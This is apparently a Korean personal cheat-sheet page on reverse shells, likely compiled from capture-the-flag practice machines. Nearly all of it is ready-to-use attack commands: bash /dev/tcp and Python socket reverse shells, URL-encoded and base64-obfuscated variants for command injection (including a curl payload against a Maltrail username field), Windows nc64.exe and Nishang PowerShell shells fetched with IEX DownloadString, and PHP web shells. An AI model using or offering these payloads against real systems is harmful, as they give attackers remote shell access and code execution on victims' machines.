---
slug: "reverse-shell"
title: "reverse_shell"
date: 2026-07-21
category: "미분류"
tags: []
excerpt: "공격 대상(서버/PC)이 공격자의 컴퓨터로 먼저 연결(접속)을 시도하도록 만드는 해킹 기술"
readingTime: 5
---

## 기본 개념
공격 대상(서버/PC)이 공격자의 컴퓨터로 먼저 연결(접속)을 시도하도록 만드는 해킹 기술

**공격자 리스너**
~~~bash
nc -lvnp {PORT}
~~~

**bash reverse shell**
~~~bash
bash -i >& /dev/tcp/{MY_IP}/{PORT} 0>&1

#이게 더 잘먹힘 -c 는 뒤에 문자열을 명령어로 실행해라 라는 뜻
bash -c \"bash -i >& /dev/tcp/{MY_IP}/{PORT} 0>&1\"
~~~

**URL 인코딩 버전 (웹쉘 통해서 실행할 때)**
~~~url
http://{IP}/{경로}/{파일}?cmd=/bin/bash+-c+'/bin/bash+-i+>%26+/dev/tcp/{IP}/{PORT}+0>%261'
~~~
-> bash로 한번 더 감싸서 특수문자 리다이렉션 확실히 처리

---
### base64 인코딩 우회 (파일명 인젝션 등)

~~~bash
#인코딩
echo -n 'bash -i >& /dev/tcp/{MY_IP}/{PORT} 0>&1' | base64

#실행
echo {BASE64} | base64 -d | bash
~~~
### 참고
- [[Networked]]: URL 인코딩 + base64 인코딩 두 가지 방법 사용

---
## Python3 소켓 리버스쉘 (가장 안정적)

**base64 생성**
```sh
python3 -c "import base64; p='python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")\''; print(base64.b64encode(p.encode()).decode())"
```

**전송 (백틱+sh 조합**)
~~~sh
curl 'http://{TARGET_domain}' --data 'username=;`echo+"{BASE64}"+|+base64+-d+|+sh`'
~~~

**왜 python3+sh 조합인가?**
bash >& 문법은 sh에서 안 됨
nc -e는 버전따라 없을 수 있음
**python3 소켓은 쉘 문법 의존 안해서 범용적**

### 참고
- [[sau]] : Maltrail v0.53 username 파라미터 injection

---
## Windows 리버스쉘

### nc64.exe (가장 간단)
```sh
# Kali에서 준비
wget https://github.com/rahuldottech/netcat-for-windows/releases/download/1.12/nc64.exe
python3 -m http.server 8000
nc -lvnp {PORT}

# 타겟 PowerShell에서
wget {KALI_IP}:8000/nc64.exe -outfile nc64.exe

# cmd에서 실행
nc64.exe -e cmd.exe {KALI_IP} {PORT}
```

## nc64 + bat 조합
```sh
#칼리에서
wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe
echo "C:\<파일 넣고 싶은 dir>\nc64.exe -e cmd.exe 10.10.14.28 5555" > shell.bat
python3 -m http.server 8000

#user에서 wget 없을때 이런 식으로 쓰면 좋음
cd <파일 넣을 dir>
powershell wget http://<ip>:8000/nc64.exe
powershell wget http://<ip>:8000/shell.bat
#-> 이후 shell.bat 실행 
```

## Nishang 리버스쉘
```sh
# 칼리에서
sudo apt install nishang
cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
echo "Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port 443" >> Invoke-PowerShellTcp.ps1
#두개 한번에 띄워놔야함
python3 -m http.server 8000
nc -lnvp 443

# 타겟:
runas /user:<도메인>\Administrator /savecred "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://<IP>:8000/Invoke-PowerShellTcp.ps1')"
```
`cmdkey /list` 결과에서 `Target: Domain:interactive=<여기>`가 도메인임


**참고**
- [[Markup]]: Scheduled Task → nc64.exe 리버스쉘 → SYSTEM
- [[servMon]]: 윈도우 리버스 쉘 열었음
- [[Access]] : 여기도 리버스쉘 열었음
---
# php 웹 쉘
~~~php
<?php system($_GET["cmd"]); ?>
~~~

```php
<?php exec("bash -c 'bash -i >& /dev/tcp/10.10.15.242/5555 0>&1'"); ?>
```

---
